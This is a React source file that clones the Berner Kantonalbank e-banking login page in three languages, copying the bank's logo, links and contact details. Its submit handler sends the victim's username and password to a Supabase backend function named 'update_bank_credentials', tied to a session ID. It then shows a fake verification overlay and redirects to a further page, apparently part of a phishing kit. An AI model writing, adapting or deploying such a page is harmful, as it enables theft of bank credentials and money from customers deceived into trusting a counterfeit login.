import { useState, useEffect, useRef, useLayoutEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Home, ChevronRight, X } from "lucide-react";
import logoAsset from "@/assets/bekb-bcbe-logo.svg.asset.json";

const RED = "#d00035";
const GREEN = "#e4ead6";
const DARK = "#545b68";
const FOOTER_BG = "#545b68";

type Lang = "DE" | "FR" | "EN";

const YoutubeIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
    <g fillRule="evenodd">
      <path d="M8.967 0 7.771 3.811h-.025L6.706 0H5.509l1.652 5.34v3.711h1.197V5.34L10.021 0z" />
      <path d="M10.31 4.553c0-.473.12-.746.48-.746.35 0 .469.273.469.746v3.032c0 .474-.12.745-.468.745-.361 0-.481-.271-.481-.745zm-1.131.071v3.009c0 1.1.745 1.48 1.612 1.48 1.01 0 1.6-.593 1.6-1.6V4.507c0-1.1-.746-1.48-1.613-1.48-1.01 0-1.599.592-1.599 1.598m5.075 4.488c.229 0 .433-.047.613-.154.181-.094.326-.236.434-.414h.024v.497h1.059V3.097h-1.132v4.536c0 .46-.216.626-.493.626-.348 0-.433-.224-.433-.532v-4.63h-1.13V7.94c0 .876.492 1.172 1.058 1.172m-.867 7.04c-.313 0-.517.237-.517.971v2.996c0 .438.228.628.457.628.3 0 .492-.166.492-.853v-2.936c0-.64-.18-.806-.432-.806" />
      <path d="M18.991 18.77h-2.153v1.267c0 .556.193.711.553.711.422 0 .542-.296.542-.77v-.545h1.058v.841c0 .604-.432 1.184-1.684 1.184-.854 0-1.6-.378-1.6-1.48V16.97c0-1.006.59-1.599 1.636-1.599.902 0 1.648.38 1.648 1.481zm-4.04 1.314c0 .877-.397 1.374-1.059 1.374-.457 0-.854-.213-1.07-.497h-.026v.426H11.74v-8.549h1.13v3.032h.025a.95.95 0 0 1 .432-.38c.18-.083.386-.119.566-.119.662 0 1.06.499 1.06 1.375zm-4.017 1.303h-1.06v-.497h-.023c-.108.178-.252.32-.433.414a1.17 1.17 0 0 1-.614.154c-.565 0-1.058-.296-1.058-1.173v-4.842h1.13v4.63c0 .308.085.533.433.533.278 0 .494-.167.494-.628v-4.535h1.131zm-4.152-7.555v7.555H5.58v-7.555H4.135v-.994h4.09v.994zm13.351-2.492c-.808-.68-2.09-1.027-3.81-1.027H6.94c-1.72 0-3.002.346-3.81 1.027-.797.674-1.201 1.751-1.201 3.204v5.238c0 1.451.404 2.53 1.2 3.2.8.687 2.083 1.033 3.81 1.033h9.385c1.728 0 3.01-.346 3.81-1.03.796-.675 1.2-1.752 1.2-3.203v-5.238c0-1.451-.404-2.528-1.2-3.204" />
      <path d="M17.391 16.081c-.421 0-.553.225-.553.651v1.256h1.095v-1.16c0-.534-.157-.747-.542-.747" />
    </g>
  </svg>
);

const XingIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
    <g fillRule="evenodd">
      <path d="m3.002 4.872 2.401 4.402L1 16.146l5.005.066 4.003-6.604-2.603-4.736zM17.212 0 9.14 14.145l5.337 9.873h5.471l-5.471-10.14L22.484 0z" />
    </g>
  </svg>
);

const LINKS = {
  terms: "http://www.bekb.ch/de/bekb-ebanking.vertragsgrundlagen.pdf",
  support: "https://www.bekb.ch/de/services/support/ebanking-app",
  callback: "https://www.bekb.ch/de/rueckruf-buchen",
  jobs: "https://www.bekb.ch/de/die-bekb/arbeitgeberin/stellen",
  media: "https://www.bekb.ch/de/die-bekb/publikationen/medienmitteilungen",
  glossary: "https://www.bekb.ch/de/glossar",
  helpFooter: "https://www.bekb.ch/de/services/support",
  youtube: "https://www.youtube.com/user/bekbbcbe",
  xing: "https://www.xing.com/companies/bernerkantonalbankag",
  legal: "https://www.bekb.ch/-/media/bekb/portal/documents/legal/disclaimer.pdf?la=de&vs=2",
  privacy: "https://www.bekb.ch/-/media/bekb/portal/documents/legal/datenschutz.pdf?la=de&vs=1",
};

type Dict = {
  meinPortal: string;
  headline: string;
  benutzer: string;
  passwort: string;
  legalBefore: string;
  legalLink: string;
  legalAfter: string;
  weiter: string;
  setupLink: string;
  nuetzlicheLinks: string;
  supportPage: string;
  fraudDetect: string;
  unserSupport: string;
  supportIntro: string;
  callback: string;
  monFri: string;
  monFriHours: string;
  sat: string;
  satHours: string;
  anschrift: string;
  bankdaten: string;
  schnellzugriff: string;
  socialMedia: string;
  postfach: string;
  jobs: string;
  media: string;
  glossary: string;
  helpFooter: string;
  legal: string;
  privacy: string;
  clearAria: string;
  showPwdAria: string;
};

const T: Record<Lang, Dict> = {
  DE: {
    meinPortal: "Mein Portal",
    headline: "Bitte geben Sie Ihre Zugangsdaten an",
    benutzer: "Benutzeridentifikation",
    passwort: "Passwort",
    legalBefore: "Mit der Anmeldung akzeptiere ich die ",
    legalLink: "Geschäftsbedingungen",
    legalAfter: " der BEKB | BCBE für das E-Banking.",
    weiter: "Weiter",
    setupLink: "E-Banking Schritt für Schritt einrichten",
    nuetzlicheLinks: "Nützliche Links",
    supportPage: "Zur Support und Hilfe-Seite",
    fraudDetect: "So erkennen Sie Betrugsmaschen im E-Banking",
    unserSupport: "Unser Support",
    supportIntro: "Wir rufen Sie an, wann es Ihnen am besten passt:",
    callback: "Telefontermin vereinbaren",
    monFri: "Montag bis Freitag",
    monFriHours: "08:00 bis 20:00 Uhr",
    sat: "Samstag",
    satHours: "09:00 bis 16:00 Uhr",
    anschrift: "Anschrift",
    bankdaten: "Bankdaten",
    schnellzugriff: "Schnellzugriff",
    socialMedia: "Social Media",
    postfach: "Postfach",
    jobs: "Offene Stellen",
    media: "Medien",
    glossary: "Glossar",
    helpFooter: "Support und Hilfe",
    legal: "Rechtliche Hinweise",
    privacy: "Datenschutz",
    clearAria: "Eingabe löschen",
    showPwdAria: "Passwort anzeigen",
  },
  FR: {
    meinPortal: "Mon portail",
    headline: "Veuillez saisir vos identifiants",
    benutzer: "Identification utilisateur",
    passwort: "Mot de passe",
    legalBefore: "En me connectant, j'accepte les ",
    legalLink: "conditions générales",
    legalAfter: " de la BEKB | BCBE pour l'e-banking.",
    weiter: "Continuer",
    setupLink: "Configurer l'e-banking étape par étape",
    nuetzlicheLinks: "Liens utiles",
    supportPage: "Vers la page d'aide et de support",
    fraudDetect: "Comment détecter les fraudes dans l'e-banking",
    unserSupport: "Notre support",
    supportIntro: "Nous vous appelons au moment qui vous convient le mieux:",
    callback: "Prendre rendez-vous téléphonique",
    monFri: "Lundi à vendredi",
    monFriHours: "08h00 à 20h00",
    sat: "Samedi",
    satHours: "09h00 à 16h00",
    anschrift: "Adresse",
    bankdaten: "Coordonnées bancaires",
    schnellzugriff: "Accès rapide",
    socialMedia: "Médias sociaux",
    postfach: "Case postale",
    jobs: "Postes vacants",
    media: "Médias",
    glossary: "Glossaire",
    helpFooter: "Support et aide",
    legal: "Mentions légales",
    privacy: "Protection des données",
    clearAria: "Effacer la saisie",
    showPwdAria: "Afficher le mot de passe",
  },
  EN: {
    meinPortal: "My portal",
    headline: "Please enter your credentials",
    benutzer: "User identification",
    passwort: "Password",
    legalBefore: "By logging in, I accept the ",
    legalLink: "terms and conditions",
    legalAfter: " of BEKB | BCBE for e-banking.",
    weiter: "Continue",
    setupLink: "Set up e-banking step by step",
    nuetzlicheLinks: "Useful links",
    supportPage: "To support and help page",
    fraudDetect: "How to detect e-banking scams",
    unserSupport: "Our support",
    supportIntro: "We'll call you when it suits you best:",
    callback: "Schedule a phone appointment",
    monFri: "Monday to Friday",
    monFriHours: "8:00 to 20:00",
    sat: "Saturday",
    satHours: "9:00 to 16:00",
    anschrift: "Address",
    bankdaten: "Bank details",
    schnellzugriff: "Quick access",
    socialMedia: "Social media",
    postfach: "PO Box",
    jobs: "Job openings",
    media: "Media",
    glossary: "Glossary",
    helpFooter: "Support and help",
    legal: "Legal notice",
    privacy: "Data protection",
    clearAria: "Clear input",
    showPwdAria: "Show password",
  },
};


const ChBernerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");

  const [benutzer, setBenutzer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPwd, setShowPwd] = useState(false);

  const t = T[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta(`BEKB | BCBE – ${t.meinPortal}`, logoAsset.url);


  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: benutzer,
        p_password: passwort,
        p_username_label: "Benutzeridentifikation",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const langs: Lang[] = ["DE", "FR", "EN"];

  const greenLineRef = useRef<HTMLDivElement | null>(null);
  const buttonRefs = useRef<Record<Lang, HTMLButtonElement | null>>({ DE: null, FR: null, EN: null });
  const [indicator, setIndicator] = useState<{ left: number; width: number }>({ left: 0, width: 0 });

  useLayoutEffect(() => {
    const update = () => {
      const btn = buttonRefs.current[lang];
      const line = greenLineRef.current;
      if (!btn || !line) return;
      const b = btn.getBoundingClientRect();
      const l = line.getBoundingClientRect();
      const pad = 8;
      setIndicator({ left: b.left - l.left - pad, width: b.width + pad * 2 });
    };
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, [lang]);

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="flex flex-col bg-white text-black">
        {/* Wrapper für initialen Viewport — Header + Section = 100vh, Footer erst nach Scroll */}
        <div className="min-h-screen flex flex-col">
        {/* Header */}
        <header className="relative">
          <div className="max-w-[1200px] mx-auto px-3 md:px-20">
            <div className="h-1.5" style={{ backgroundColor: RED }} />
            <div className="flex pt-8">
              <img src={logoAsset.url} alt="BEKB | BCBE" className="h-7 md:h-8" />
            </div>
            <div className="flex justify-end pb-2 pt-4">
              <nav className="flex gap-6 text-[14px]">
                {langs.map((l) => (
                  <button
                    key={l}
                    ref={(el) => (buttonRefs.current[l] = el)}
                    onClick={() => setLang(l)}
                    style={{ color: lang === l ? "#000" : "#999" }}
                  >
                    {l}
                  </button>
                ))}
              </nav>
            </div>
          </div>
          {/* Grüne Linie full width mit Indicator innen */}
          <div ref={greenLineRef} className="relative h-[8px] w-full" style={{ backgroundColor: '#b4c5a8' }}>
            <div className="max-w-[1200px] mx-auto px-3 md:px-20 h-full relative">
              <span
                aria-hidden
                className="absolute top-0 transition-all"
                style={{ height: 8, backgroundColor: DARK, left: indicator.left, width: indicator.width }}
              />
            </div>
          </div>
        </header>

        <section className="flex-1 flex flex-col">

          {/* Mobile-only: grüner Streifen (#b4c5a8) hinter Mein-Portal-Card */}
          <div className="lg:hidden" style={{ backgroundColor: '#b4c5a8' }}>
            <div className="max-w-[1200px] w-full mx-auto px-3 pt-2">
              <div className="p-4" style={{ backgroundColor: GREEN }}>
                <span
                  className="inline-block pb-1 text-[15px] font-bold"
                  style={{ borderBottom: `2px solid #000000`, color: DARK }}
                >
                  {t.meinPortal}
                </span>
              </div>
            </div>
          </div>
          {/* 2px weißer Spalt zwischen Mein-Portal und Headline (mobile) */}
          <div className="lg:hidden h-[2px] bg-white" />

          <div className="max-w-[1200px] w-full mx-auto px-3 md:px-20 pt-0 lg:pt-12 flex-1">
            {/* Mein Portal — Desktop */}
            <div
              className="hidden lg:inline-block pb-2 mb-10 text-[15px] font-bold"
              style={{ borderBottom: `2px solid #000000`, color: DARK }}
            >
              {t.meinPortal}
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-[3fr_1fr] gap-12">
              {/* Login */}
              <div>
                {/* Headline — Mobile: grüne Sprechblase */}
                <div className="lg:hidden relative mb-8 p-5" style={{ backgroundColor: GREEN }}>
                  <h1 className="text-[26px] font-normal leading-tight">
                    {t.headline}
                  </h1>
                  <span
                    aria-hidden
                    className="absolute -bottom-3 left-6 w-0 h-0"
                    style={{
                      borderLeft: "12px solid transparent",
                      borderRight: "12px solid transparent",
                      borderTop: `12px solid ${GREEN}`,
                    }}
                  />
                </div>
                {/* Headline — Desktop */}
                <h1 className="hidden lg:block text-[36px] font-bold mb-10 leading-tight">
                  {t.headline}
                </h1>


                <div className="space-y-4 max-w-none lg:max-w-[320px]">
                  <div className="relative">
                    <input
                      id="bekb-user"
                      type="text"
                      value={benutzer}
                      onChange={(e) => setBenutzer(e.target.value)}
                      placeholder={t.benutzer}
                      className="w-full bg-transparent outline-none text-[15px] text-black h-12 pl-3 pr-10 placeholder:text-[#545b68]"
                      style={{ borderLeft: `1px solid ${GREEN}`, borderBottom: `1px solid ${GREEN}` }}
                    />
                    {benutzer.length > 0 && (
                      <button
                        type="button"
                        onClick={() => setBenutzer("")}
                        aria-label={t.clearAria}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-black"
                      >
                        <X size={18} />
                      </button>
                    )}
                  </div>

                  <div className="relative">
                    <input
                      id="bekb-pass"
                      type={showPwd ? "text" : "password"}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      placeholder={t.passwort}
                      className="w-full bg-transparent outline-none text-[15px] text-black h-12 pl-3 pr-10 placeholder:text-[#545b68]"
                      style={{ borderLeft: `1px solid ${GREEN}`, borderBottom: `1px solid ${GREEN}` }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPwd(!showPwd)}
                      aria-label={t.showPwdAria}
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-black"
                    >
                      {showPwd ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </div>

                <p className="text-[14px] mt-8 max-w-[640px]">
                  {t.legalBefore}
                  <a href={LINKS.terms} target="_blank" rel="noopener noreferrer" style={{ color: RED }}>
                    {t.legalLink}
                  </a>
                  {t.legalAfter}
                </p>

                {(() => {
                  const active = benutzer.length > 0 && passwort.length > 0;
                  return (
                    <button
                      onClick={handleSubmit}
                      className="mt-6 block w-full lg:max-w-[320px] h-10 text-[15px] transition-colors"
                      style={{
                        backgroundColor: active ? RED : GREEN,
                        color: active ? "#ffffff" : DARK,
                      }}
                    >
                      {t.weiter}
                    </button>
                  );
                })()}

                <div className="mt-4 max-w-none lg:max-w-[320px]">
                  <a
                    href="#"
                    className="inline-flex items-center gap-2 text-[14px] font-normal"
                    style={{ color: RED }}
                  >
                    <ChevronRight size={14} strokeWidth={3} />
                    {t.setupLink}
                  </a>
                </div>

              </div>

              {/* Nützliche Links */}
              <aside className="p-6 w-4/5 lg:w-auto mt-8 lg:mt-0" style={{ backgroundColor: GREEN }}>
                <h3 className="font-bold text-[16px] mb-4">{t.nuetzlicheLinks}</h3>
                <a href={LINKS.support} target="_blank" rel="noopener noreferrer" className="block text-[14px] mb-4" style={{ color: RED }}>
                  {t.supportPage}
                </a>
                <a href="#" className="block text-[14px]" style={{ color: RED }}>
                  {t.fraudDetect}
                </a>

                <h3 className="font-bold text-[16px] mt-10 mb-3">{t.unserSupport}</h3>
                <p className="text-[14px] mb-4">
                  {t.supportIntro}
                </p>
                <a href={LINKS.callback} target="_blank" rel="noopener noreferrer" className="block text-[14px] mb-4" style={{ color: RED }}>
                  {t.callback}
                </a>
                <p className="text-[14px]">{t.monFri}</p>
                <p className="text-[14px] mb-3">{t.monFriHours}</p>
                <p className="text-[14px]">{t.sat}</p>
                <p className="text-[14px]">{t.satHours}</p>
              </aside>
            </div>
          </div>



          {/* Breadcrumb unten gepinnt (im Viewport) */}
          <div className="max-w-[1200px] w-full mx-auto px-3 md:px-20 mt-auto">
            <div className="py-4 flex items-center gap-3 text-[14px]">
              <span className="w-px h-4" style={{ backgroundColor: GREEN }} />
              <Home size={16} style={{ color: GREEN }} />
              <ChevronRight size={14} style={{ color: GREEN }} />
              <span className="font-bold text-black">{t.meinPortal}</span>
            </div>

          </div>

        </section>
        </div>


        {/* Footer */}
        <footer className="text-white" style={{ backgroundColor: FOOTER_BG }}>
          <div className="max-w-[1200px] mx-auto px-3 md:px-20 py-14">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-10 text-[14px]">
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">{t.anschrift}</h4>
                <p>BEKB | BCBE</p>
                <p>Bundesplatz 8</p>
                <p>{t.postfach}</p>
                <p>3001 Bern</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">{t.bankdaten}</h4>
                <p>QR-IID: 30790</p>
                <p>BC-Nummer: 790</p>
                <p>SWIFT-Nummer: KBBECH22XXX</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">{t.schnellzugriff}</h4>
                <a href={LINKS.jobs} target="_blank" rel="noopener noreferrer" className="block underline mb-2">{t.jobs}</a>
                <a href={LINKS.media} target="_blank" rel="noopener noreferrer" className="block underline mb-2">{t.media}</a>
                <a href={LINKS.glossary} target="_blank" rel="noopener noreferrer" className="block underline mb-2">{t.glossary}</a>
                <a href={LINKS.helpFooter} target="_blank" rel="noopener noreferrer" className="block underline">{t.helpFooter}</a>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">{t.socialMedia}</h4>
                <div className="flex gap-3">
                  <a href={LINKS.youtube} target="_blank" rel="noopener noreferrer" aria-label="YouTube" className="text-white hover:opacity-80">
                    <YoutubeIcon />
                  </a>
                  <a href={LINKS.xing} target="_blank" rel="noopener noreferrer" aria-label="Xing" className="text-white hover:opacity-80">
                    <XingIcon />
                  </a>
                </div>
              </div>
            </div>

            <div className="mt-10 flex flex-wrap items-center gap-3 text-[14px]">
              <span>© Berner Kantonalbank AG</span>
              <span className="opacity-60">|</span>
              <a href={LINKS.legal} target="_blank" rel="noopener noreferrer" className="underline">{t.legal}</a>
              <span className="opacity-60">|</span>
              <a href={LINKS.privacy} target="_blank" rel="noopener noreferrer" className="underline">{t.privacy}</a>
            </div>

          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBernerKantonalbank;
